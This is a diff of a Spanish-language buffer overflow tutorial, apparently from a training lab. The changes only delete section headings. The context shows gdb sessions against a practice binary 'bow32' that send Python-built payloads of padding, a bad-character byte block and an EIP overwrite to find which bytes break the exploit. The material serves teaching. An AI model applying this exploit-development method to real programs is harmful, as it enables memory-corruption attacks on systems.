@@ -338,7 +338,6 @@ Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 25
 
 Breakpoint 1, 0x56555551 in bowfunc ()
 ```
-#### La pila
 
 Después de haber ejecutado nuestro buffer con los caracteres incorrectos y haber alcanzado el punto de interrupción, podemos mirar la pila.
 
@@ -359,10 +358,6 @@ Después de haber ejecutado nuestro buffer con los caracteres incorrectos y habe
 ```
 
 Aquí reconocemos en qué dirección `\x55`comienza nuestro " ". A partir de aquí, podemos ir más abajo y buscar el lugar donde `CHARS`comienza nuestro " ".
-
-#### La pila - CHARS
-
-  Identificación de malos personajes
 
 ```shell-session
 <SNIP>
@@ -391,8 +386,6 @@ Buffer = "\x55" * (1040 - 255 - 4) = 781
    EIP = "\x66" * 4
 ```
 
-#### Enviar CHARS - Sin byte nulo
-
 ```shell-session
 (gdb) run $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
 
@@ -402,8 +395,6 @@ Start it from the beginning? (y or n) y
 Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
 Breakpoint 1, 0x56555551 in bowfunc ()
 ```
-
-#### La pila
 
 ```shell-session
 (gdb) x/2000xb $esp+550
@@ -428,7 +419,6 @@ Buffer = "\x55" * (1040 - 254 - 4) = 782
  
    EIP = "\x66" * 4
 ```
-#### Enviar CHARS - Sin "\x00" y "\x09"
 
 ```shell-session
 (gdb) run $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
@@ -439,7 +429,6 @@ Start it from the beginning? (y or n) y
 Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
 Breakpoint 1, 0x56555551 in bowfunc ()
 ```
-#### La pila
 
 ```shell-session
 (gdb) x/2000xb $esp+550
